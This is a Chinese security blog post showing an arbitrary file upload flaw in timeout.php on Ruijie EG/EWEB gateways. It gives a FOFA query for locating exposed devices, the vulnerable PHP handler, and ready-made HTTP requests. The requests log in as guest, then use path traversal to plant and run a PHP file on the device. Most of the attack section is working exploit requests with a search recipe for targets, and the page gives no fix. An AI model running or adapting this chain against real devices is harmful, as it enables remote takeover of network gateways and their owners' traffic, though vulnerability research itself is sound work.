---
title: "锐捷-EWEB timeout.php 文件上传漏洞"
source: https://mrxn.net/jswz/ruijieweb-system_pi-timeout-rce.html
asset_dir: assets/锐捷-eweb-timeout.php-文件上传漏洞
---

# 锐捷-EWEB timeout.php 文件上传漏洞

[Mrxn](https://mrxn.net/author/1)* 发表于2025/3/27 18:43
* 1071浏览
* [0评论](#comment)
* 12分钟阅读

深入探索

网络安全课程

SQL注入防护

安全运维咨询


(adsbygoogle = window.adsbygoogle || []).push({});

---

# 漏洞简介

锐捷EG易网关是一款综合网关，由锐捷网络完全自主研发。它集成了先进的软硬件体系架构，配备了DPI深入分析引擎、行为分析/管理引擎，可以在保证网络出口高效转发的条件下，提供专业的流控功能、出色的URL过滤以及本地化的日志存储/审计服务。锐捷EG易网关 `timeout.php` 存在任意[文件上传](https://mrxn.net/tag/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0)漏洞，攻击者可以利用该漏洞向设备上传任意文件，造成设备[远程代码执行](https://mrxn.net/tag/rce)和被控制。

漏洞修复方案

# 影响版本

<=2022.07.28.01

# fofa语法

> `title="锐捷网络-EWEB网管系统" || app="Ruijie-EG易网关" && body="/login.php?a=version"`

# 漏洞分析

看下 `timeout.php` 关键业务 `uploadAction` 逻辑的实现

```
function uploadAction() {
    $fileName = p("fileName");
    $mes = p("mes");
    $mes = iconv("utf-8","GBK//IGNORE",$mes);
    $fp = fopen(DS . "data" . DS . $fileName , "w");
    if ($fp && fwrite($fp, $mes)) {
        fclose($fp);
        json_echo(true);
    } else {
        json_echo(FALSE);
    }
}
```

`uploadAction` 接收一个 `fileName` 参数用作 `fopen` 函数的写入文件名，`mes` 参数的值作为写入文件的内容，无任何过滤或校验，因此造成任意[文件上传漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)。

# 漏洞复现

## 获取cookie

```
POST /ddi/server/login.php HTTP/1.1
Host: ruijieweb.mrxn.net
Content-Type: application/x-www-form-urlencoded

username=guest&password=guest?
```

深入探索

云安全解决方案

编程语言教程

在线安全工具

[![锐捷-EWEB timeout.php 文件上传漏洞](images/img-001-489e6f4b63e4.webp)](https://image.mrxn.net/e2433a412d6049e3b49ff42339f02422.webp)

## 上传文件

深入探索

SQL注入检测工具

企业安全咨询

漏洞预警服务

```
POST /system_pi/timeout.php?a=upload HTTP/1.1
Host: ruijieweb.mrxn.net
Content-Type: application/x-www-form-urlencoded
Cookie: RUIJIEID=xxxxxxxxxxl855hve3xxxxxxxx
X-Requested-With: XMLHttpRequest
Accept-Encoding: gzip

fileName=../tmp/html/test1.php&mes=<?=phpinfo();unlink(__FILE__);
```

访问上传文件 /test1.php

漏洞修复方案

[![锐捷-EWEB timeout.php 文件上传漏洞](images/img-002-16138cb71c67.webp)](https://image.mrxn.net/96afd23ce73e495e83a6eebdd73a58f2.webp)

成功打印 phpinfo 信息

* 标签：
* [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
* [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
* [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
* [#rce](https://mrxn.net/tag/rce)
* [#文件上传](https://mrxn.net/tag/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0)

---


// 获取当前脚本所在的父容器
const parentContainer = document.currentScript.parentElement;
let searchContainer = parentContainer.querySelector('article') || parentContainer;
if (searchContainer) {
// 优先在 class 名为 prose 或 markdown 的容器内搜索 img 图片
let images = [];
const containers = searchContainer.querySelectorAll('.prose, .markdown');
containers.forEach(function(container) {
images = images.concat(Array.from(container.querySelectorAll('img')));
});
if (images.length === 0) {
images = searchContainer.querySelectorAll('img');
}
images.forEach(function(img) {
if (img.getAttribute('data-action') === 'zoom') {
const parentLink = img.parentNode;
if (parentLink.tagName === 'A') {
parentLink.setAttribute('data-fancybox', 'gallery');
}
} else {
const link = document.createElement('a');
link.setAttribute('data-fancybox', 'gallery');
link.setAttribute('href', img.getAttribute('src'));
img.parentNode.insertBefore(link, img);
link.appendChild(img);
}
});
// 初始化 Fancybox
Fancybox.bind("[data-fancybox]", {
// 您的自定义选项
});
}

文章目录
×

* [1.漏洞简介](#toc-1-)
* [2.影响版本](#toc-2-)
* [3.fofa语法](#toc-3-)
* [4.漏洞分析](#toc-4-)
* [5.漏洞复现](#toc-5-)
* [5.1.获取cookie](#toc-5-1-)
* [5.2.上传文件](#toc-5-2-)



.x\_nav\_toc {
position: fixed;
top: 0;
right: -300px;
width: 280px;
height: 100%;
background-color: white;
box-shadow: -2px 0 15px rgba(0, 0, 0, 0.1);
z-index: 1000;
transition: right 0.3s ease;
display: flex;
flex-direction: column;
overflow: hidden;
padding-top: 10px;
}
.x\_nav\_toc.active {
right: 0;
}
.x\_toc\_header {
display: flex;
justify-content: space-between;
align-items: center;
padding: 15px 20px;
height: 48px;
border-bottom: 1px solid #eee;
}
.x\_toc\_title {
font-size: 18px;
font-weight: bold;
color: #333;
}
.x\_toc\_close {
background: none;
border: none;
font-size: 24px;
cursor: pointer;
color: #777;
transition: color 0.2s;
}
.x\_toc\_close:hover {
color: #333;
}
.x\_toc\_content {
flex: 1;
overflow-y: auto;
padding: 15px 20px;
padding-right: 10px;
}
.x\_anchor-list {
list-style-type: none;
padding: 0;
margin: 0;
}
/\* 减小目录项间距 \*/
.x\_anchor-list li {
margin-bottom: 4px; /\* 间距从8px减小到4px \*/
}
.x\_anchor-list a {
text-decoration: none;
color: #555;
display: block;
padding: 6px 10px; /\* 减少内边距 \*/
transition: all 0.2s;
font-size: 14px;
border-radius: 4px;
line-height: 1.4; /\* 减小行高 \*/
}
.x\_anchor-list a:hover,
.x\_anchor-list a:focus {
background-color: #f8f9fa;
color: #0068d6;
}
.toc-number {
font-weight: 600;
margin-right: 8px;
color: #495057;
display: inline-block;
min-width: 25px;
}
/\* 减小各级标题间距 \*/
.toc-h1 {
font-weight: 600;
font-size: 15px;
margin-top: 10px; /\* 上边距从15px减小到10px \*/
padding-left: 5px !important;
}
.toc-h2 {
font-size: 14px;
padding-left: 15px !important; /\* 缩进从20px减小到15px \*/
}
.toc-h3 {
font-size: 13px;
padding-left: 25px !important; /\* 缩进从30px减小到25px \*/
}
.toc-h4 {
font-size: 12px;
padding-left: 35px !important; /\* 缩进从40px减小到35px \*/
}
/\* 修改后的切换按钮样式 - 使用图标且位置下移 \*/
.x\_toc\_toggle {
position: fixed;
bottom:120px; right: 17px;width:40px;height:40px;background-color:white;
border-radius: 50%;
border: none;
cursor: pointer;
box-shadow: 0 4px 12px rgba(0,0,0,0.15);
z-index: 999;
transition: all 0.3s ease;
display: flex;
align-items: center;
justify-content: center;
padding: 0;
}
.x\_toc\_toggle svg {
width:24px;height:24px;stroke:#3d9bff;
}
.x\_toc\_toggle:hover {
#background-color: #0081f8;
transform: translateY(-3px);
box-shadow: 0 6px 15px rgba(0,0,0,0.2);
}
@media (max-width: 768px) {
.x\_nav\_toc {
width: 280px;
}
.x\_toc\_toggle {
bottom: 100px; /\* 手机端也下移位置 \*/
right: 30px;
width: 40px;
height: 40px;
}
.x\_toc\_toggle svg {
width: 20px;
height: 20px;
}
}

document.addEventListener('DOMContentLoaded', function() {
// 获取所有标题元素
var className = ".line-numbers";
var selectors = [];
for (var i = 1; i <= 6; i++) {
selectors.push(className + ' h' + i);
}
var headings = document.querySelectorAll(selectors.join(', '));
// 获取DOM元素
var tocContainer = document.querySelector('.x\_nav\_toc');
var toggleButton = document.querySelector('.x\_toc\_toggle');
var tocList = document.querySelector('.x\_anchor-list');
var closeButton = document.querySelector('.x\_toc\_close');
var currentHighlight = null;
// 检测是否为移动设备
const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
// 如果没有标题，隐藏所有元素
if (headings.length === 0) {
tocContainer.style.display = 'none';
toggleButton.style.display = 'none';
return;
}
// 初始化层级计数器
var counters = [0, 0, 0, 0, 0, 0]; // h1-h6
var currentLevel = 0;
// 生成带数字编号的目录
headings.forEach(function(heading, index) {
var level = parseInt(heading.tagName[1]);
// 更新计数器
counters[level - 1] += 1; // 增加当前级别计数器
// 重置更低级计数器
for (var i = level; i < 6; i++) {
counters[i] = 0;
}
// 生成编号字符串（如"1.2.3"）
var numberParts = [];
for (var i = 0; i < level; i++) {
if (counters[i] > 0) {
numberParts.push(counters[i]);
}
}
var numberText = numberParts.join('.')+'.';
// 创建唯一ID
var id = 'toc-' + numberText.replace(/\./g, '-');
heading.id = id;
var listItem = document.createElement('li');
var anchor = document.createElement('a');
var numberSpan = document.createElement('span');
numberSpan.className = 'toc-number';
numberSpan.textContent = numberText;
anchor.appendChild(numberSpan);
anchor.innerHTML += heading.textContent;
anchor.href = '#' + id;
anchor.classList.add('toc-h' + level);
listItem.appendChild(anchor);
tocList.appendChild(listItem);
// 添加点击事件（不关闭目录）
anchor.addEventListener('click', function(e) {
e.preventDefault();
// 更新高亮状态
if (currentHighlight) {
currentHighlight.classList.remove('active');
}
this.classList.add('active');
currentHighlight = this;
// 滚动到对应位置
var targetId = this.getAttribute('href').substring(1);
var targetElement = document.getElementById(targetId);
if (targetElement) {
var header = document.querySelector("header");
var headerHeight = header ? header.offsetHeight : 0;
var elementPosition = targetElement.getBoundingClientRect().top + window.pageYOffset;
var offsetPosition = elementPosition - headerHeight - 20;
window.scrollTo({
top: offsetPosition,
behavior: 'smooth'
});
// 滚动到目录项的可视区域
this.scrollIntoView({behavior: 'smooth', block: 'nearest'});
// 点击事件中
if (isMobile) {
closeToc(); // 移动端点击后关闭目录
}
}
});
});
// 切换按钮点击事件
toggleButton.addEventListener('click', function() {
tocContainer.classList.add('active');
});
// 关闭按钮点击事件
closeButton.addEventListener('click', function(e) {
e.stopPropagation();
closeToc();
});
// 滚动时更新高亮状态
window.addEventListener('scroll', function() {
var fromTop = window.scrollY;
var header = document.querySelector("header");
var headerHeight = header ? header.getBoundingClientRect().height : 0; // 更精确的header高度
//console.log(headerHeight);
// 精准计算标题文档位置
var activeSection = null;
headings.forEach(function(heading) {
var section = document.getElementById(heading.id);
if (!section) return;
// 使用getBoundingClientRect获取精确位置
var rect = section.getBoundingClientRect();
var sectionTop = rect.top + fromTop; // 转换为文档顶部绝对位置
var sectionBottom = rect.bottom + fromTop + headerHeight;
// 增加20px激活区域缓冲
if (fromTop + headerHeight + 20 >= sectionTop && fromTop < sectionBottom) {
activeSection = heading;
}
});
// 更新高亮状态（新增精确边界判断）
if (activeSection) {
var tocLink = tocList.querySelector('a[href="#' + activeSection.id + '"]');
if (tocLink && currentHighlight !== tocLink) {
if (currentHighlight) {
currentHighlight.blur();
currentHighlight.classList.remove('active');
}
tocLink.classList.add('active');
tocLink.focus();
currentHighlight = tocLink;
// 平滑滚动到可视区域（改进触发条件）
var tocRect = tocLink.getBoundingClientRect();
var tocContainerRect = tocContainer.getBoundingClientRect();
if (tocRect.bottom > tocContainerRect.bottom || tocRect.top < tocContainerRect.top) {
tocLink.scrollIntoView({behavior: 'auto', block: 'nearest'});
}
}
}
});
// 关闭目录面板
function closeToc() {
tocContainer.classList.remove('active');
}
});

/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
#qrcode-right {
display: none;
}
}

版权所有：[Mrxn's Blog](https://mrxn.net/)  
文章标题：[锐捷-EWEB timeout.php 文件上传漏洞](https://mrxn.net/jswz/ruijieweb-system_pi-timeout-rce.html)  
文章链接：<https://mrxn.net/jswz/ruijieweb-system_pi-timeout-rce.html>  
本站文章均为原创，未经授权请勿用于任何商业用途。仅供安全研究和学习使用。若因传播、利用本文档信息而产生任何直接或间接的后果或损害，均由使用者自行承担，文章作者不为此承担任何责任。

![](data:image/png;base64,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)

设备上扫码阅读


var qrcode = new QRCode(document.getElementById("copyright-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/ruijieweb-system\_pi-timeout-rce.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});

  

### 📚 推荐阅读

* [深信服运维安全管理系统 install\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-install_patch-rce.html)
* [深信服运维安全管理系统 del\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-del_patch-rce.html)
* [深信服运维安全管理系统 upload\_file 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-cssp-app-upload_file-rce.html)
* [深信服运维安全管理系统 csspost/update 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-csspost-update-rce.html)
* [深信服运维安全管理系统 save\_SNMP 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-SNMP-save_SNMP-rce.html)
* [深信服运维安全管理系统 getLdap 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-getLdap-rce.html)
* [深信服运维安全管理系统 Jwt 密钥硬编码](https://mrxn.net/jswz/sangfor_osm-login-search_login-token-leak.html)
* [深信服运维安全管理系统 del\_route 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_route-rce.html)
* [深信服运维安全管理系统 del\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_net-rce.html)
* [深信服运维安全管理系统 change\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-change_net-rce.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 updateLoginName SQL注入漏洞](https://mrxn.net/jswz/bigant-user-updateLoginName-sqli.html)
* [九佳易管理系统 PrivilegedCodeDestroy.asmx SQL注入漏洞](https://mrxn.net/jswz/a8erp-Interface-licx-PrivilegedCodeDestroy-sqli.html)
* [九佳易管理系统 Ajax\_XT.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-Ajax_XT-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 moveDept SQL注入漏洞](https://mrxn.net/jswz/bigant-dept-moveDept-sqli.html)
* [青龙面板最新版v2.20.1 鉴权绕过致RCE漏洞](https://mrxn.net/jswz/qinglong-auth-bypass-rce.html)
* [九佳易管理系统 picHY.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-HuiYuanDangAn-picHY-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 安装程序二次注入致远程代码执行漏洞](https://mrxn.net/jswz/bigant-install-config-rce.html)
* [东胜物流软件 MsChDuiController 多个SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsChDuiController-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 PublicController 任意文件读取漏洞](https://mrxn.net/jswz/bigant-Public-download.html)
* [东胜物流软件 MsAnnounceController SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsAnnounce-GetData-sqli.html)

安全工具开发

  

/\* 底部展示样式 \*/
.qrcode-bottom-box {
margin: 40px auto;
text-align: center;
}
.qrcode-title {
font-size: 16px;
color: #666;
margin-bottom: 0px;
font-weight: bold;
text-align: center;
}
.qrcode-bottom-box img {
display: inline-block;
padding: 10px;
background: #fff;
border-radius: 8px;
margin: 10px auto;
}
/\* 悬浮展示样式 \*/
.qrcode-float {
position: fixed;
z-index: 9999;
background: rgba(255,255,255,0.98);
padding: 20px;
border-radius: 12px;
}
.qrcode-float:hover {
transform: scale(1.05);
}
/\* 移动端适配 \*/
@media (max-width: 1440px) {
.qrcode-float {
right: 2%;
transform: none;
}
}
/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
.qrcode-float {
display: none;
}
}

![](data:image/png;base64,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